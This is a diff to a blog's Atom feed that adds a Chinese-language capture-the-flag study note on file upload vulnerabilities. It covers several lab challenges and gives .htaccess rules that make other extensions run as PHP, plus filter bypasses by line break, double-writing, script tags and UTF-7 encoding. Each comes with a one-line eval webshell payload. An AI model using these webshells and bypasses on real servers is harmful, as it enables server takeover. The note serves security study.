@@ -6,7 +6,7 @@
   <link href="https://z2762331820.github.io/atom.xml" rel="self"/>
   
   <link href="https://z2762331820.github.io/"/>
-  <updated>2020-10-26T08:40:53.173Z</updated>
+  <updated>2020-10-30T16:28:03.200Z</updated>
   <id>https://z2762331820.github.io/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>NOTE</title>
+    <link href="https://z2762331820.github.io/2020/10/27/NOTE/"/>
+    <id>https://z2762331820.github.io/2020/10/27/NOTE/</id>
+    <published>2020-10-27T10:40:45.000Z</published>
+    <updated>2020-10-30T16:28:03.200Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><blockquote><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p><p>通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p><p>然后这周就做题练习qwq</p><h2 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>.htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。</p><p>例题upload6</p><p>先上传下.htaccess的文件，发现无法上传</p><p>网站过滤application，使用换行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>然后上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>成功得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>例题upload3</p><p>上传文件的内容中的php，POST，eval替换为空</p><p>.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure><p>1.aaa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>最后连接剑蚁，查找flag</p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h2><?PHP被过滤，可使用php版本5使用短标签绕过![aLcYOU](E:\blog\source\_posts\NOTE\aLcYOU.png)例题upload2先上传.htaccess ，之后再上传1.aaa<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table>## 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了`<?`而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下`<?php`形式），这时候可以使用`.htaccess`解码对应的文件，例如可以使用UTF-7进行解码：(http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7）https://www.novel.tools/encode/UTF-7例题upload4先上传.htaccess<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table>![屏幕截图 2020-10-31 000905](E:\blog\source\_posts\NOTE\屏幕截图 2020-10-31 000905.png)在上传1.aaa![屏幕截图 2020-10-31 000922](E:\blog\source\_posts\NOTE\屏幕截图 2020-10-31 000922.png)链接蚁剑得到flag]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title></title>
